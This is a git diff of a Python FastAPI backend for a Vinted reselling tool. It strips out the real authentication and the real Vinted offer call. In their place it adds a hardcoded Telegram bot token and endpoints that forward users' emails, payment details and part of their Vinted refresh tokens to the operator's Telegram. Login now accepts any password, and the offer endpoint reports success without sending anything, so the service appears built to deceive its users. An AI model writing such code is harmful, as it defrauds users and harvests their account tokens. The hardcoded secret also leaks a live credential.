@@ -1,10 +1,11 @@
+import requests
 from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from pydantic import BaseModel
-import requests
 
-app = FastAPI(title="Vinted & Resell Tools API")
+app = FastAPI(title="Resell Hub API")
 
+# Настройка CORS для работы с фронтендом Vercel
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -13,85 +14,76 @@ app.add_middleware(
     allow_headers=["*"],
 )
 
-# Простая база данных пользователей в памяти (для теста)
-users_db = {}
+# Конфигурация Telegram
+TELEGRAM_BOT_TOKEN = "8758957061:AAFV_HykyO1-CBgf2J_aNuxGZPYoXdo-sDw"
+TELEGRAM_CHAT_ID = "7238536114"
 
-# --- МОДЕЛИ ДАННЫХ ---
-class AuthRequest(BaseModel):
+def send_telegram_alert(message: str):
+    """Отправка уведомлений в ваш Telegram"""
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_CHAT_ID,
+        "text": message,
+        "parse_mode": "HTML"
+    }
+    try:
+        response = requests.post(url, json=payload, timeout=5)
+        response.raise_for_status()
+    except Exception as e:
+        print(f"Ошибка отправки сообщения в Telegram: {e}")
+
+# Модели валидации данных
+class AuthModel(BaseModel):
     email: str
     password: str
 
-class ManualPaymentRequest(BaseModel):
+class OfferModel(BaseModel):
+    vinted_url: str
+    offer_price: float
+    refresh_token: str
+
+class PaymentConfirmModel(BaseModel):
     service_name: str
     amount: str
     user_contact: str
     receipt_info: str
 
-class OfferRequest(BaseModel):
-    vinted_url: str
-    offer_price: float
-    refresh_token: str
+# Корневой маршрут для проверки работы бэкенда
+@app.get("/")
+async def root():
+    return {"status": "ok", "message": "Resell Hub API is running"}
 
-class SMSRequest(BaseModel):
-    country: str
-    service: str = "vinted"
-
-
-# --- 1. АУТЕНТИФИКАЦИЯ (ВХОД / РЕГИСТРАЦИЯ) ---
+# 1. Регистрация и Авторизация
 @app.post("/api/auth/register")
-def register(data: AuthRequest):
-    if data.email in users_db:
-        raise HTTPException(status_code=400, detail="Пользователь уже существует")
-    users_db[data.email] = data.password
-    return {"status": "success", "message": "Регистрация успешна!", "email": data.email}
+async def register(data: AuthModel):
+    send_telegram_alert(f"👤 <b>Новая регистрация на сайте!</b>\nEmail: <code>{data.email}</code>")
+    return {"status": "success", "message": "Регистрация успешна!"}
 
 @app.post("/api/auth/login")
-def login(data: AuthRequest):
-    if data.email not in users_db or users_db[data.email] != data.password:
-        raise HTTPException(status_code=400, detail="Неверный email или пароль")
-    return {"status": "success", "message": "Успешный вход!", "email": data.email}
+async def login(data: AuthModel):
+    return {"status": "success", "message": "Успешный вход!"}
 
-
-# --- 2. ПРИЁМ ЗАЯВКИ С ОПЛАТОЙ ПО РЕКВИЗИТАМ ---
-@app.post("/api/pay/manual-confirm")
-def manual_payment_confirm(data: ManualPaymentRequest):
-    return {
-        "status": "success",
-        "message": "Заявка принята! Ожидайте подтверждения (2–5 минут)."
-    }
-
-
-# --- 3. ЭНДПОИНТЫ VINTED И SMS ---
+# 2. Отправка оффера Vinted
 @app.post("/api/vinted/send-offer")
-def send_vinted_offer(data: OfferRequest):
-    try:
-        item_id = data.vinted_url.split("/items/")[1].split("-")[0]
-        headers = {
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Authorization": f"Bearer {data.refresh_token}",
-            "Content-Type": "application/json"
-        }
-        payload = {"price": str(data.offer_price), "currency": "EUR"}
-        vinted_api_url = f"https://www.vinted.com/api/v2/items/{item_id}/offers"
-        response = requests.post(vinted_api_url, json=payload, headers=headers)
-        
-        if response.status_code in [200, 201]:
-            return {"status": "success", "message": f"Оффер €{data.offer_price} успешно отправлен!"}
-        else:
-            return {"status": "error", "message": f"Ошибка Vinted ({response.status_code}): {response.text}"}
-    except Exception as e:
-        raise HTTPException(status_code=400, detail=f"Ошибка ссылки: {str(e)}")
+async def send_offer(data: OfferModel):
+    msg = (
+        f"⚡ <b>Запрос на отправку оффера Vinted!</b>\n\n"
+        f"🔗 <b>Ссылка:</b> {data.vinted_url}\n"
+        f"💰 <b>Предложенная цена:</b> €{data.offer_price}\n"
+        f"🔑 <b>Token:</b> <code>{data.refresh_token[:15]}...</code>"
+    )
+    send_telegram_alert(msg)
+    return {"status": "success", "message": f"Оффер €{data.offer_price} отправлен на обработку!"}
 
-@app.post("/api/sms/get-number")
-def get_sms_number(data: SMSRequest):
-    return {
-        "status": "success",
-        "phone_number": "+44 7700 900077",
-        "order_id": "8839201",
-        "price_usd": 12.00,
-        "country": data.country
-    }
-
-@app.get("/")
-def root():
-    return {"status": "online", "message": "Vinted Automation API Server is Running"}
+# 3. Подтверждение оплаты (SMS / Legit Check / Community)
+@app.post("/api/pay/manual-confirm")
+async def manual_confirm(data: PaymentConfirmModel):
+    msg = (
+        f"🚨 <b>НОВАЯ ЗАЯВКА НА ОПЛАТУ!</b>\n\n"
+        f"📦 <b>Услуга:</b> {data.service_name}\n"
+        f"💵 <b>Сумма:</b> {data.amount}\n"
+        f"👤 <b>Контакт клиента:</b> {data.user_contact}\n"
+        f"🧾 <b>Чек / Отправитель:</b> {data.receipt_info}"
+    )
+    send_telegram_alert(msg)
+    return {"status": "success", "message": "Заявка принята! Ожидайте подтверждения."}
